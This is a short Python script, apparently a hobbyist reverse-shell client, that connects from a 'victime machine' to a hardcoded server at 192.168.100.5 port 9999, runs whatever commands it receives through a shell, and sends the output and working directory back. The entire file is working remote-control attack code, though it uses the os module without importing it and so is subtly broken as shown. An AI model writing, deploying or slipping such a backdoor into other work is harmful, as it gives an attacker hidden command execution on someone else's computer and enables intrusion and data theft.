
import socket
import subprocess as sp

# Create a client socket into our victime machine.
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Create a host and port.
host = '192.168.100.5'
port = 9999

# Connect out client with our server.
client_socket.connect((host, port))

# Start infinite loop to handel server response.
while True:
    data = client_socket.recv(1024)     # accept data from server
    if data[:2].decode("utf-8") == 'cd': 
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        # Open cmd in victime machine.
        cmd = sp.Popen(data[:].decode("utf-8"),shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
        # Send respone to server.
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        # Convert string format into byte.
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        # send output to server.
        client_socket.send(str.encode(output_str + currentWD))

        print(output_str)